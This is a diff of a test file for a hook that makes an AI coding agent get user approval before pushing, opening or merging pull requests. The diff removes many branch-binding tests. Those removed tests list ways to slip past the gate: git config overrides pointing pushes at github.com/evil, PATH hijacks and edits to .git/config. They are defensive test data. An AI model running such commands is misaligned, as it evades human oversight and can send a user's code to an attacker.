@@ -18,7 +18,7 @@ import {
   gatedVerbs,
   isApproving,
   pushGateReason,
-  shipTargets,
+  canonicalShip,
   browserCommand,
   substitutions,
   branchRules,
@@ -1217,385 +1217,22 @@ function pushGateTmp() {
   return { h, stateFile: join(h, 'state.json') };
 }
 
-/** A repo on `branch` (unborn is enough) whose origin is github.com/o/r: rule 8
- *  binds an approval to the repo and branch a gated call ships (#305). */
-function shipRepo(branch = 'feat/x', dir = tempDir('ship-')) {
-  execFileSync('git', ['init', '-q', '-b', branch, dir]);
-  execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', 'https://github.com/o/r.git']);
-  return dir;
-}
-const SHIP = shipRepo();
+test('push is allowed after an approving answer, then blocked on reuse', () => {
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptWith(h, { 'Commit, push and open a PR?': 'Commit + PR (Recommended)' });
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
+  assert.ok(pushGateReason('git push', '/repo', t, stateFile));
+});
 
-// A stub for gh's PR lookup: PR 12 is feat/x's, PR 13 is feat/other's.
-const PR_HEADS = { 12: 'feat/x', 13: 'feat/other' };
-const prHead = (ref) => PR_HEADS[String(ref).replace(/^.*\/pull\//, '')] ?? null;
-
-test('#305: one answer covers a branch whole ship — push, PR create, fix push, merge', () => {
+test('one approval covers push, pr create and pr merge exactly once each', () => {
   const { h, stateFile } = pushGateTmp();
   const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push -u origin feat/x', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr create --fill', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null, 'a CI-fix push');
-  assert.equal(pushGateReason('git push --force-with-lease', SHIP, t, stateFile), null, 'a second fix push');
-  assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile), null);
-  // The merge used the approval up: a later push needs a new answer.
-  assert.match(pushGateReason('git push', SHIP, t, stateFile) || '', /merged/);
-  assert.match(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile) || '', /merged/);
-});
-
-test('#305: under that same answer, a push, PR or merge of a second branch blocks', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-  for (const cmd of [
-    'git push origin feat/other',
-    'git push origin HEAD:feat/other',
-    'gh pr create --head feat/other',
-    'gh pr merge feat/other',
-    'gh pr merge 13 --rebase',
-    'gh pr merge 12 --rebase -R o/elsewhere',
-  ]) {
-    assert.match(pushGateReason(cmd, SHIP, t, stateFile, undefined, null, { prHead }) || '', /github\.com\/o\/r#feat\/x/, cmd);
-  }
-  // Another checkout on another branch is another branch too ...
-  const other = shipRepo('feat/other');
-  assert.ok(pushGateReason('git push', other, t, stateFile));
-  // ... and the same branch name in another repo is another repo.
-  const elsewhere = shipRepo('feat/x');
-  execFileSync('git', ['-C', elsewhere, 'remote', 'set-url', 'origin', 'git@github.com:o/elsewhere.git']);
-  assert.ok(pushGateReason('git push', elsewhere, t, stateFile));
-  // The bound branch still passes after those blocks.
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-});
-
-test('#305: a newer refusing answer still blocks a bound branch', () => {
-  const { h, stateFile } = pushGateTmp();
-  const approve = answered('Push + open PR');
-  assert.equal(pushGateReason('git push', SHIP, transcriptOf(h, approve), stateFile), null);
-  assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, approve, answered('Review first')), stateFile));
-  assert.ok(pushGateReason('gh pr merge --rebase', SHIP, transcriptOf(h, approve, typed('wait — hold off')), stateFile));
-});
-
-test('#305: a command holding several gated verbs passes when one approval covers them all', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push -u origin feat/x && gh pr create --fill', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('git push; gh pr merge 12 --rebase', SHIP, t, stateFile, undefined, null, { prHead }), null);
-});
-
-test('#305: a command shipping two branches blocks, and binds nothing', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  for (const cmd of ['git push origin feat/a && git push origin feat/b', 'git push origin feat/a feat/b', 'git push origin feat/a && gh pr create --head feat/b']) {
-    assert.match(pushGateReason(cmd, SHIP, t, stateFile) || '', /one branch/, cmd);
-  }
-  assert.equal(pushGateReason('git push origin feat/b', SHIP, t, stateFile), null);
-});
-
-test('#305: a branch the guard cannot determine blocks with a remedy, and binds nothing', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  const detached = shipRepo('feat/d');
-  execFileSync('git', ['-C', detached, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'root']);
-  execFileSync('git', ['-C', detached, 'checkout', '-q', '--detach']);
-  const noRemote = tempDir('nr-');
-  execFileSync('git', ['init', '-q', '-b', 'feat/x', noRemote]);
-  const cases = [
-    ['cd $d && git push', SHIP],
-    ['git push origin $B', SHIP],
-    ['git push origin $(git branch --show-current)', SHIP],
-    ['git push --all origin', SHIP],
-    ['git push --tags', SHIP],
-    ['git push origin v1:refs/tags/v1', SHIP],
-    ['git push', detached],
-    ['git push', tempDir('nogit-')],
-    ['git push', noRemote],
-    ['gh pr create --fill', tempDir('nogit-')],
-    ['gh pr merge 99 --rebase', SHIP], // the stub has no PR 99: the lookup failed
-    ['gh pr merge https://github.com/o/r/pull/99', SHIP],
-    ['gh pr merge $N --rebase', SHIP],
-    ['gh pr merge -R o/r', tempDir('nogit-')],
-    ['GH_REPO=x/y gh pr merge feat/x', SHIP],
-  ];
-  for (const [cmd, cwd] of cases) {
-    assert.match(pushGateReason(cmd, cwd, t, stateFile, undefined, null, { prHead }) || '', /can't tell which branch/, cmd);
-  }
-  // Nothing was bound: the first determinable call binds, to its own branch.
-  assert.equal(pushGateReason('git push origin feat/b', SHIP, t, stateFile), null);
-  assert.ok(pushGateReason('git push origin feat/x', SHIP, t, stateFile));
-});
-
-test('#305: a merge by number or URL resolves its PR head; -R names the repo from any dir', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr merge 12 --rebase -R o/r', tempDir('nogit-'), t, stateFile, undefined, null, { prHead }), null);
-  // The first gated call under an answer may be the merge itself.
-  const { stateFile: s2 } = pushGateTmp();
-  assert.equal(pushGateReason('gh pr merge https://github.com/o/r/pull/13', SHIP, t, s2, undefined, null, { prHead }), null);
-  assert.match(pushGateReason('git push origin feat/other', SHIP, t, s2) || '', /merged/);
-});
-
-test('#305: shipTargets reads the repo and branch each gated call ships', () => {
-  const T = (cmd, cwd = SHIP) => shipTargets(cmd, cwd, null, { prHead }).map((x) => x.target ?? `!${x.verb}`);
-  const X = 'github.com/o/r#feat/x';
-  for (const cmd of [
-    'git push',
-    'git push origin',
-    'git push -u origin feat/x 2>&1',
-    'git push origin HEAD > out.txt',
-    'git push origin +feat/x',
-    'git push origin refs/heads/feat/x',
-    'git push origin HEAD:feat/x',
-    'git push origin local:refs/heads/feat/x',
-    'git push https://github.com/O/R.git feat/x',
-    'git push -o ci.skip origin feat/x',
-    `git -C ${SHIP} push`,
-    'gh pr create --fill',
-    'gh pr create --head feat/x -R O/R --title "a b"',
-    'gh pr create --head=o:feat/x --repo=o/r',
-    'git push --no-follow-tags --recurse-submodules=check origin feat/x',
-    'git push --recurse-submodules=no origin feat/x',
-    'git -c core.quotepath=false push origin feat/x',
-    'gh pr merge --rebase',
-    'gh pr merge feat/x --squash -R github.com/o/r',
-    'gh pr merge 12 --rebase --body "x y"',
-    'gh pr merge -t subj 12',
-    'gh pr merge -r 12', // merge's -r is --rebase, not create's --reviewer
-    'git push origin @',
-    'gh pr create -m M1 -r someone',
-    'gh pr merge https://github.com/o/r/pull/12',
-    'gh -R o/r pr merge 12 -d',
-  ]) {
-    assert.deepEqual(T(cmd), [X], cmd);
-  }
-  assert.deepEqual(T(`cd ${tempDir('nogit-')} && gh pr merge 12 -R o/r`), [X]);
-  assert.deepEqual(T('git push origin :feat/gone feat/x'), [X]);
-  assert.deepEqual(T('git push && gh pr create --fill'), [X, X]);
-  assert.deepEqual(T('gh pr merge 13'), ['github.com/o/r#feat/other']);
-  // merge's -m is --merge, a boolean: the number after it is still the PR.
-  assert.deepEqual(T('gh pr merge -m 13'), ['github.com/o/r#feat/other']);
-  assert.deepEqual(T('git push origin feat/x:HEAD'), ['!git push']);
-  assert.deepEqual(T('git push --dry-run origin'), []);
-  assert.deepEqual(T('git push origin feat/x && gh pr view 12'), [X]);
-});
-
-// ---- #305 review: anything the guard can't read with certainty fails closed ----
-// A bound approval allows repeated pushes, so a target read wrong would turn one
-// answer into unlimited pushes anywhere.
-
-/** shipTargets' verdict per command: the targets, or `!why` for an unreadable one. */
-const targetsIn = (cmd, cwd = SHIP) => shipTargets(cmd, cwd, null, { prHead }).map((x) => x.target ?? `!${x.why}`);
-const unreadable = (cmd, cwd = SHIP) => assert.ok(targetsIn(cmd, cwd).some((t) => t.startsWith('!')), `${cmd} → ${JSON.stringify(targetsIn(cmd, cwd))}`);
-
-/** A ship repo with extra config: [key, value] pairs, each added (`--add`). */
-function cfgRepo(pairs, branch = 'feat/x') {
-  const dir = shipRepo(branch);
-  for (const [k, v] of pairs) execFileSync('git', ['-C', dir, 'config', '--add', k, v]);
-  return dir;
-}
-
-test('#305 review 1: a matching refspec (`:`, `+:`) blocks and binds nothing', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  for (const cmd of ['git push origin :', 'git push origin +:', 'git push origin feat/x :']) {
-    assert.match(pushGateReason(cmd, SHIP, t, stateFile) || '', /can't tell which branch/, cmd);
-  }
-  assert.equal(pushGateReason('git push origin feat/b', SHIP, t, stateFile), null);
-  assert.ok(pushGateReason('git push origin main', SHIP, t, stateFile));
-  assert.ok(pushGateReason('git push origin feat/b :', SHIP, t, stateFile));
-});
-
-test('#305 review 2: git dir, work tree and config overrides on the command line fail closed', () => {
-  for (const cmd of [
-    'GIT_DIR=/x/.git git push origin feat/x',
-    'env GIT_DIR=/x/.git git push origin feat/x',
-    'export GIT_DIR=/x/.git; git push origin feat/x',
-    'GIT_WORK_TREE=/x git push origin feat/x',
-    'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://github.com/evil/x; git push origin feat/x',
-    "GIT_CONFIG_PARAMETERS=\"'remote.origin.pushurl'='x'\" git push origin feat/x",
-    "$env:GIT_DIR = 'x'; git push origin feat/x",
-    'env -C /x git push origin feat/x',
-    'env --chdir=/x git push origin feat/x',
-    'git --git-dir=/x/.git push origin feat/x',
-    'git --git-dir /x/.git push origin feat/x',
-    'git --work-tree=/x push origin feat/x',
-    'git --config-env=remote.origin.pushurl=EVIL push origin feat/x',
-    'git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat/x',
-    'git -c push.default=matching push',
-    'git -c url.https://github.com/evil/.pushInsteadOf=https://github.com/o/ push origin feat/x',
-    'git -c branch.feat/x.merge=refs/heads/main push',
-    'git -c Remote.origin.push=refs/heads/feat/x:refs/heads/main push origin feat/x',
-    'git -c alias.p=push p origin main',
-    'GIT_DIR=/x/.git gh pr merge feat/x',
-  ]) {
-    unreadable(cmd);
-  }
-  // A -c alias call is gated even though its subcommand isn't push.
-  const { h, stateFile } = pushGateTmp();
-  assert.ok(pushGateReason('git -c alias.p=push p origin main', SHIP, join(h, 'none.jsonl'), stateFile));
-});
-
-test('#305 review 3: push config that could send the push elsewhere fails closed; the last value wins', () => {
-  const bare = [
-    [['push.default', 'upstream']],
-    [['push.default', 'tracking']],
-    [['push.default', 'matching']],
-    [['branch.feat/x.merge', 'refs/heads/main']],
-  ];
-  for (const pairs of bare) {
-    unreadable('git push', cfgRepo(pairs));
-    unreadable('git push origin', cfgRepo(pairs));
-  }
-  // An explicit <remote> <branch> is unaffected by push.default and upstream config.
-  assert.deepEqual(targetsIn('git push origin feat/x', cfgRepo([['push.default', 'matching'], ['branch.feat/x.merge', 'refs/heads/main']])), ['github.com/o/r#feat/x']);
-  for (const pairs of [
-    [['remote.origin.push', 'refs/heads/feat/x:refs/heads/main']],
-    [['remote.origin.mirror', 'true']],
-    [['remote.origin.pushurl', 'https://github.com/o/r.git'], ['remote.origin.pushurl', 'https://github.com/evil/x.git']],
-    [['remote.origin.url', 'https://github.com/evil/x.git']], // a second url: push goes to both
-    [['url.https://github.com/evil/.pushInsteadOf', 'https://github.com/o/']],
-    [['url.https://github.com/evil/.insteadOf', 'https://github.com/o/']],
-    [['push.followTags', 'true']],
-    [['push.recurseSubmodules', 'on-demand']],
-  ]) {
-    unreadable('git push origin feat/x', cfgRepo(pairs));
-  }
-  // The last value wins, as in git: push.default back to simple passes ...
-  assert.deepEqual(targetsIn('git push', cfgRepo([['push.default', 'matching'], ['push.default', 'simple'], ['branch.feat/x.merge', 'refs/heads/feat/x']])), ['github.com/o/r#feat/x']);
-  // ... and a bare push goes to the last branch.<b>.remote.
-  const forked = cfgRepo([['remote.fork.url', 'https://github.com/o/fork.git'], ['branch.feat/x.remote', 'origin'], ['branch.feat/x.remote', 'fork']]);
-  assert.deepEqual(targetsIn('git push', forked), ['github.com/o/fork#feat/x']);
-});
-
-test('#305 review 4: --follow-tags and --recurse-submodules (but =no/check) fail closed', () => {
-  for (const cmd of ['git push --follow-tags origin feat/x', 'git push --recurse-submodules=on-demand origin feat/x', 'git push --recurse-submodules=only origin feat/x', 'git push --recurse-submodules origin feat/x']) {
-    unreadable(cmd);
-  }
-});
-
-test('#305 review 5: gh pr create -H owner:branch keeps the owner, and another owner blocks', () => {
-  unreadable('gh pr create -H someone:feat/x');
-  unreadable('gh pr create --head=evil:feat/x -R o/r');
-  assert.deepEqual(targetsIn('gh pr create -H O:feat/x'), ['github.com/o/r#feat/x']);
-});
-
-test('#305 review 7: gh pr merge --auto leaves CI-fix pushes open', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr merge --auto --rebase', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null, 'a CI-fix push after --auto');
-  assert.equal(pushGateReason('gh pr merge --disable-auto', SHIP, t, stateFile), null, 'turning auto-merge off');
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-});
-
-test('#305 review2 4: a create and a merge (auto or not) run once per binding', () => {
-  const { h, stateFile } = pushGateTmp();
-  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr create --fill', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr merge --auto --rebase', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null, 'a CI-fix push after --auto');
-  assert.match(pushGateReason('gh pr create --fill', SHIP, t, stateFile) || '', /already ran gh pr create/);
-  assert.match(pushGateReason('gh pr merge --auto --rebase', SHIP, t, stateFile) || '', /already ran gh pr merge/);
-  assert.match(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile) || '', /already ran gh pr merge/);
-  // Two of one verb in one command count twice.
-  const { stateFile: s2 } = pushGateTmp();
-  assert.match(pushGateReason('gh pr create --fill && gh pr create --fill', SHIP, t, s2) || '', /already ran gh pr create|more than once/);
-  assert.match(pushGateReason('gh pr merge --auto && gh pr merge', SHIP, t, s2) || '', /already ran gh pr merge|more than once/);
-  // A create whose call errored is refunded (#147).
-  const { h: h3, stateFile: s3 } = pushGateTmp();
-  const t3 = transcriptWithResults(h3, { toolu_C: true });
-  assert.equal(pushGateReason('gh pr create --fill', SHIP, t3, s3, 'toolu_C'), null);
-  assert.equal(pushGateReason('gh pr create --fill', SHIP, t3, s3, 'toolu_C2'), null);
-  assert.match(pushGateReason('gh pr create --fill', SHIP, t3, s3, 'toolu_C3') || '', /already ran gh pr create/);
-});
-
-test('#305 review2 1: a gated command carrying a step that could change what ships fails closed', () => {
-  const t = transcriptWith(pushGateTmp().h, { 'Ship it?': 'Push + open PR' });
-  for (const cmd of [
-    'git checkout other && git push -u origin HEAD',
-    'git checkout main && git push',
-    'git switch -c x && git push',
-    'git checkout -b x -- a.txt && git push',
-    'git branch -m main && git push',
-    'git checkout other && gh pr create --fill',
-    'git remote set-url origin https://github.com/evil/x.git && git push origin feat/x',
-    'git config remote.origin.pushurl https://github.com/evil/x.git; git push origin feat/x',
-    'gh repo set-default evil/x && gh pr create --fill',
-    'gh alias set p "pr merge" && gh pr merge feat/x',
-    'git pull && git push',
-    'git rebase origin/main && git push',
-    'node -e "x" && git push',
-    'pnpm test && git push',
-    'echo x > .git/HEAD; git push',
-    'cat cfg > .git/config && git push origin feat/x',
-    'export PATH=/evil:$PATH; git push origin feat/x',
-    "$env:PATH = 'C:/evil'; git push origin feat/x",
-    'sed -i s/r/evil/ .git/config && git push origin feat/x',
-    'git push && git checkout main',
-    'rm .git/index && git push',
-    "awk 'BEGIN{system(\"git checkout main\")}' && git push",
-    'echo x > "$UNKNOWN/f" && git push',
-    'F=.git/HEAD; echo x > $F; git push',
-    'touch ~/.gitconfig && git push',
-  ]) {
-    const { stateFile } = pushGateTmp();
-    assert.match(pushGateReason(cmd, SHIP, t, stateFile) || '', /in its own Bash call, then retry/, cmd);
-    // Nothing was bound: another branch still binds afresh.
-    assert.equal(pushGateReason('git push origin feat/b', SHIP, t, stateFile), null, cmd);
-  }
-  for (const cmd of [
-    'git add a b && git commit -q -F msg.txt && git push -u origin feat/x 2>&1 | tail -3',
-    `cd ${SHIP} && git push origin feat/x`,
-    'git status --short && git log --oneline -1 && git diff --stat && git push',
-    'git fetch origin && git rev-parse HEAD && git ls-remote origin && git push',
-    'git push && gh pr create --fill --body "$(cat body.md)" && gh pr view --json url',
-    'git branch --show-current && git remote -v && git config --get remote.origin.url && git push',
-    "git commit -q -F - <<'MSG'\nfeat: x\nMSG\ngit push origin feat/x",
-    'git push origin feat/x > out.txt 2>&1; echo $?',
-    'git push origin feat/x 2>&1 | grep -v remote: | head -5',
-    'gh pr checks && gh pr merge --rebase',
-    'sleep 5; gh pr checks; git push',
-    'git push origin feat/x > "$TEMP/p.txt" 2>&1; echo rc=$?; cat "$TEMP/p.txt"',
-    "S=/tmp/s; cat > \"$S/body.md\" <<'EOF'\nbody\nEOF\ngh pr create --body-file \"$S/body.md\"",
-    'rm -f /tmp/x.md && git push',
-    'git checkout -- pnpm-lock.yaml && git restore a.txt && git push',
-    "gh issue comment 5 -b done && git push && git log -1 --format=%h | awk '{print $1}'",
-  ]) {
-    const { stateFile } = pushGateTmp();
-    assert.equal(pushGateReason(cmd, SHIP, t, stateFile), null, cmd);
-  }
-});
-
-test('#305 review2 2: a remote name is resolved through git, never read as a URL', () => {
-  const dir = cfgRepo([['remote.o/r.url', 'https://github.com/evil/x.git']]);
-  assert.deepEqual(targetsIn('git push o/r feat/x', dir), ['github.com/evil/x#feat/x']);
-  unreadable('git push me/r feat/x'); // no such remote
-  unreadable('git push ../elsewhere.git feat/x'); // a path: not a remote git can name here
-  assert.deepEqual(targetsIn('git push git@github.com:o/r.git feat/x'), ['github.com/o/r#feat/x']);
-  assert.deepEqual(targetsIn('git push ssh://git@github.com/o/r feat/x'), ['github.com/o/r#feat/x']);
-});
-
-test('#305 review2 3: HOME, XDG_CONFIG_HOME and USERPROFILE set in the command fail closed', () => {
-  for (const cmd of [
-    'HOME=/h git push origin feat/x',
-    'export HOME=/h; git push origin feat/x',
-    'env XDG_CONFIG_HOME=/x git push origin feat/x',
-    'XDG_CONFIG_HOME=/x gh pr create --fill',
-    "$env:USERPROFILE = 'C:/x'; git push origin feat/x",
-    "$env:HOME='C:/x'; git push origin feat/x",
-  ]) {
-    unreadable(cmd);
-  }
-  // Reading them is fine.
-  assert.deepEqual(targetsIn('git push origin feat/x && echo $HOME $USERPROFILE'), ['github.com/o/r#feat/x']);
-});
-
-test('#305 review 8: the block quotes the current CLAUDE.md approval rule', () => {
-  const { h, stateFile } = pushGateTmp();
-  assert.match(pushGateReason('git push', SHIP, join(h, 'none.jsonl'), stateFile) || '', /Push, PR create, PR merge need explicit user approval \(hook-gated\); commits need none\./);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
+  assert.equal(pushGateReason('gh pr create --fill', '/repo', t, stateFile), null);
+  assert.equal(pushGateReason('gh pr merge --rebase', '/repo', t, stateFile), null);
+  // Each verb is single-use even under the same approval.
+  assert.ok(pushGateReason('git push', '/repo', t, stateFile));
+  assert.ok(pushGateReason('gh pr merge --rebase', '/repo', t, stateFile));
 });
 
 test('the latest answer blocks even when an older answer in the same transcript approved', () => {
@@ -1604,40 +1241,40 @@ test('the latest answer blocks even when an older answer in the same transcript 
   const older = { type: 'user', uuid: 'u-old', timestamp: '2026-10-01T00:00:00.000Z', toolUseResult: { questions: [], answers: { 'Push?': 'Push + open PR' } } };
   const newer = { type: 'user', uuid: 'u-new', timestamp: '2026-10-02T00:00:00.000Z', toolUseResult: { questions: [], answers: { 'Push?': 'Review first' } } };
   writeFileSync(path, `${JSON.stringify(older)}\n${JSON.stringify(newer)}\n`);
-  assert.ok(pushGateReason('git push', SHIP, path, stateFile));
+  assert.ok(pushGateReason('git push', '/repo', path, stateFile));
 });
 
 test('free-text approval allows, deny wording blocks', () => {
   const { h, stateFile } = pushGateTmp();
   const t1 = transcriptWith(h, { 'Should I proceed?': 'yes go ahead and push it' });
-  assert.equal(pushGateReason('git push', SHIP, t1, stateFile), null);
+  assert.equal(pushGateReason('git push', '/repo', t1, stateFile), null);
 
   const { stateFile: stateFile2 } = pushGateTmp();
   const t2 = transcriptWith(h, { 'Should I proceed?': "hold off, don't push yet" });
-  assert.ok(pushGateReason('git push', SHIP, t2, stateFile2));
+  assert.ok(pushGateReason('git push', '/repo', t2, stateFile2));
 });
 
 test('a missing or unreadable transcript blocks (fail-closed)', () => {
   const { h, stateFile } = pushGateTmp();
-  assert.ok(pushGateReason('git push', SHIP, join(h, 'does-not-exist.jsonl'), stateFile));
-  assert.ok(pushGateReason('git push', SHIP, undefined, stateFile));
+  assert.ok(pushGateReason('git push', '/repo', join(h, 'does-not-exist.jsonl'), stateFile));
+  assert.ok(pushGateReason('git push', '/repo', undefined, stateFile));
 });
 
 test('a transcript with no answer record blocks', () => {
   const { h, stateFile } = pushGateTmp();
   const path = join(h, 'empty.jsonl');
   writeFileSync(path, `${JSON.stringify({ type: 'assistant', uuid: 'a1' })}\n`);
-  assert.ok(pushGateReason('git push', SHIP, path, stateFile));
+  assert.ok(pushGateReason('git push', '/repo', path, stateFile));
 });
 
 test('a non-gated command never consults pushGateReason input at all (gatedVerb short-circuits)', () => {
   // No transcript/state file given at all — if this read the transcript it would throw.
-  assert.equal(pushGateReason('gh pr view 12', SHIP, '/no/such/transcript.jsonl', '/no/such/state.json'), null);
-  assert.equal(pushGateReason('echo "git push"', SHIP, '/no/such/transcript.jsonl', '/no/such/state.json'), null);
+  assert.equal(pushGateReason('gh pr view 12', '/repo', '/no/such/transcript.jsonl', '/no/such/state.json'), null);
+  assert.equal(pushGateReason('echo "git push"', '/repo', '/no/such/transcript.jsonl', '/no/such/state.json'), null);
 });
 
-test('end-to-end through the real hook: git push is gated and binds its approval to the branch', () => {
-  const h = shipRepo('feat/x', tmpHome());
+test('end-to-end through the real hook: git push is gated and spends its approval once', () => {
+  const h = tmpHome();
   const transcriptPath = join(h, 'transcript.jsonl');
   writeFileSync(
     transcriptPath,
@@ -1645,18 +1282,31 @@ test('end-to-end through the real hook: git push is gated and binds its approval
   );
   // No approval reachable yet (bad path) — fails closed.
   assert.equal(guardRunT('git push', h, join(h, 'missing.jsonl')), 2);
-  // Approving transcript: the branch's pushes pass, another branch's push blocks.
+  // Approving transcript: first push passes, second is blocked (spent).
   assert.equal(guardRunT('git push', h, transcriptPath), 0);
-  assert.equal(guardRunT('git push && gh pr create --fill', h, transcriptPath), 0);
-  assert.equal(guardRunT('git push origin feat/other', h, transcriptPath), 2);
+  assert.equal(guardRunT('git push', h, transcriptPath), 2);
   // A non-gated command with the very same transcript is untouched.
   assert.equal(guardRunT('git status', h, transcriptPath), 0);
+});
+
+// --- #75 follow-up (a): one gated verb per Bash call ---------------------------
+
+test('a command with more than one gated verb is blocked without spending the approval', () => {
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
+  for (const cmd of ['git push; gh pr create --fill', 'git push && git push origin v1', 'gh pr create --fill && gh pr merge --rebase']) {
+    const reason = pushGateReason(cmd, '/repo', t, stateFile);
+    assert.match(reason || '', /own Bash call/, cmd);
+  }
+  // Nothing was spent: each verb still passes once on its own.
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
+  assert.equal(pushGateReason('gh pr create --fill', '/repo', t, stateFile), null);
 });
 
 test('one gated verb next to ungated commands is still a single gated call', () => {
   const { h, stateFile } = pushGateTmp();
   const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
-  assert.equal(pushGateReason('git status && git push -u origin feat/x', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('git status && git push -u origin feat/x', '/repo', t, stateFile), null);
 });
 
 // --- #75 follow-up (b): gh global flags before the subcommand -------------------
@@ -1888,7 +1538,7 @@ test('#96 incident: "…push and pr but … dont know if…" approves the push',
   const t = transcriptWith(h, {
     'Ready?': 'looks good commit push and pr but we need to ... dont know if you could cli it ...',
   });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
 });
 
 test('#96: negated acts, leading "no" and hold words still refuse', () => {
@@ -1969,60 +1619,53 @@ test('heredocs without a doubled backslash, and text that only mentions one, pas
   assert.equal(staticCheck(`cat <<< "a${BS2}b"`), null);
 });
 
-// ---- refund a merge or a binding whose call errored (#147, #305) -------------
+// ---- refund a spent approval whose call errored (#147) ----------------------
 
-/** A transcript: the approving answer record, then a tool_result per `results`
- *  entry (tool_use_id → is_error). */
-function transcriptWithResults(dir, results) {
+/** A transcript: the approving answer record, then a tool_result for `id`. */
+function transcriptWithResult(dir, id, isError) {
   const path = join(dir, `r-${Math.random().toString(36).slice(2)}.jsonl`);
   const answer = { type: 'user', uuid: 'u-ship', timestamp: new Date().toISOString(), toolUseResult: { questions: [], answers: { 'Ship?': 'Push + open PR' } } };
-  const lines = [answer, ...Object.entries(results).map(([id, isError]) => ({ type: 'user', uuid: `u-${id}`, message: { content: [{ type: 'tool_result', tool_use_id: id, is_error: isError, content: 'x' }] } }))];
-  writeFileSync(path, lines.map((l) => `${JSON.stringify(l)}\n`).join(''));
+  const result = { type: 'user', uuid: 'u-res', message: { content: [{ type: 'tool_result', tool_use_id: id, is_error: isError, content: 'x' }] } };
+  writeFileSync(path, `${JSON.stringify(answer)}\n${JSON.stringify(result)}\n`);
   return path;
 }
 
-test('a merge whose tool_result errored is refunded: a fix push and a retried merge pass', () => {
+test('a spend whose tool_result errored is refunded at the next gated call', () => {
   const { h, stateFile } = pushGateTmp();
-  const t = transcriptWithResults(h, { toolu_M: true });
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile, 'toolu_P'), null);
-  assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile, 'toolu_M'), null);
-  // The merge errored (checks pending, conflict), so the PR is still open ...
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile, 'toolu_F'), null);
-  assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile, 'toolu_M2'), null);
-  // ... and the retried merge, with no errored result, used the approval up.
-  assert.match(pushGateReason('git push', SHIP, t, stateFile, 'toolu_G') || '', /merged/);
+  const t = transcriptWithResult(h, 'toolu_A', true);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_A'), null);
+  // The push errored, so the retry is allowed against the same answer ...
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_B'), null);
+  // ... and its spend stands (toolu_B has no errored result).
+  assert.ok(pushGateReason('git push', '/repo', t, stateFile, 'toolu_C'));
 });
 
-test('a merge whose tool_result succeeded, or is missing, or has no tool_use_id uses the approval up', () => {
-  for (const [results, id] of [[{ toolu_M: false }, 'toolu_M'], [{ toolu_ZZ: true }, 'toolu_M'], [{ toolu_M: true }, undefined]]) {
-    const { h, stateFile } = pushGateTmp();
-    const t = transcriptWithResults(h, results);
-    assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile, id), null);
-    assert.match(pushGateReason('git push', SHIP, t, stateFile, 'toolu_B') || '', /merged/, JSON.stringify([results, id]));
-  }
+test('a spend whose tool_result succeeded, or is missing, is not refunded', () => {
+  const { h, stateFile } = pushGateTmp();
+  const ok = transcriptWithResult(h, 'toolu_A', false);
+  assert.equal(pushGateReason('git push', '/repo', ok, stateFile, 'toolu_A'), null);
+  assert.ok(pushGateReason('git push', '/repo', ok, stateFile, 'toolu_B'));
+
+  const { h: h2, stateFile: stateFile2 } = pushGateTmp();
+  const other = transcriptWithResult(h2, 'toolu_ZZ', true);
+  assert.equal(pushGateReason('git push', '/repo', other, stateFile2, 'toolu_A'), null);
